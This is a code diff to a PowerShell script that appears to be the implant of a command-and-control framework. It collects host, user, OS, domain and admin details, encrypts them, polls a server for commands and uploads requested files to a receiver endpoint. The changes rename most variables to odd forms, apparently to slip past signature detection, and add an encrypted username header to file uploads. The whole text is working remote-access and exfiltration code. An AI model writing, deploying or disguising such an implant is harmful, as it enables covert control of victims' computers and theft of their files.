@@ -30,8 +30,8 @@ function Create-AesManagedObject($AES_KEY, $AES_IV) {
 function EncryptAES($AES_KEY, $AES_IV, $unencryptedString) {
     $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
     $aesManaged = Create-AesManagedObject $AES_KEY $AES_IV
-    $encryptor = $aesManaged.CreateEncryptor()
-    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
+    $encryptorrr = $aesManaged.CreateEncryptor()
+    $encryptedData = $encryptorrr.TransformFinalBlock($bytes, 0, $bytes.Length);
     [System.Convert]::ToBase64String($encryptedData)
 }
 
@@ -49,13 +49,16 @@ $wc = New-Object system.Net.WebClient;
 $wc2 = New-Object system.Net.WebClient;
 $wcr = New-Object system.Net.WebClient;
 $hostname = $env:COMPUTERNAME;
-$he = EncryptAES $AES_KEY $AES_IV $hostname
-$random = -join ((65..90) | Get-Random -Count 5 | % {[char]$_});
-$final_hostname = "$hostname-$random";
-$whoami = $env:USERNAME;
-$arch = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
-$os = (Get-WmiObject -class Win32_OperatingSystem).Caption + "($arch)";
-$domain = (Get-WmiObject Win32_ComputerSystem).Domain;
+$hehehe = EncryptAES $AES_KEY $AES_IV $hostname
+$randommm = -join ((65..90) | Get-Random -Count 5 | % {[char]$_});
+$r2 = $randommm;
+$fhstname = "$hostname-$r2";
+$whoamiii = $env:USERNAME;
+$whmenc = EncryptAES $AES_KEY $AES_IV $whoamiii
+$arch22 = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
+$osos = (Get-WmiObject -class Win32_OperatingSystem).Caption + "($arch22)";
+$dddomain = (Get-WmiObject Win32_ComputerSystem).Domain;
+
 
 $procarch = [Environment]::Is64BitProcess
 $procarchf = ""
@@ -67,12 +70,12 @@ $user_identity = [Security.Principal.WindowsIdentity]::GetCurrent();
 $iselv = (New-Object Security.Principal.WindowsPrincipal $user_identity).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
 
 if($iselv){
-$whoami = $whoami + "*"
+$whoamiii = $whoamiii + "*"
 }
 
-$raw_header = "$final_hostname,$whoami,$os,$pnid,$domain";
+$raw_header = "$fhstname,$whoamiii,$osos,$pnid,$dddomain";
 $encrypted_header = EncryptAES $AES_KEY $AES_IV $raw_header;
-$final_hostname_encrypted = EncryptAES $AES_KEY $AES_IV $final_hostname
+$final_hostname_encrypted = EncryptAES $AES_KEY $AES_IV $fhstname
 
 $wch = $wc.headers;
 $wch.add("Authorization", $encrypted_header);
@@ -83,7 +86,7 @@ $failure_counter = 0;
 while($true){
 
     try{
-    $command_raw = $wc2.downloadString("OCU_PROTO://SRVHOST/OCT_command/$final_hostname");
+    $command_raw = $wc2.downloadString("OCU_PROTO://SRVHOST/OCT_command/$fhstname");
     }catch{
     $failure_counter=$failure_counter +1;
     if ($failure_counter -eq OCT_AKILL){
@@ -108,17 +111,17 @@ while($true){
       $wcrh = $wcr.Headers;
       $wcrh.add("Authorization", $pst);
       $wcrh.add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
-      $wcrh.add("App-Logic", $he);
+      $wcrh.add("App-Logic", $hehehe);
       $wcr.downloadString("OCU_PROTO://SRVHOST/OCT_report");
     } elseif($fc.split(" ")[0] -eq "Download"){
         $filename = EncryptAES $AES_KEY $AES_IV $fc.split("\")[-1]
-        $file_content = Get-Content $fc.split(" ")[1] -Encoding byte
-        #$Bytes = [System.Text.Encoding]::Unicode.GetBytes($file_content);
+        $file_content = [System.IO.File]::ReadAllBytes($fc.split(" ")[1])
         $EncodedText = [Convert]::ToBase64String($file_content);
         $efc = EncryptAES $AES_KEY $AES_IV $EncodedText;
         $wc3 = new-object net.WebClient;
         $wc3h = $wc3.Headers;
         $wc3h.add("Content-Type", "application/x-www-form-urlencoded");
+        $wc3h.add("x-Authorization", $whmenc);
         $wc3.UploadString("OCU_PROTO://SRVHOST/OCT_file_receiver", "fn=$filename&token=$efc");
     } elseif($fc -eq "reset-ps"){
         try{
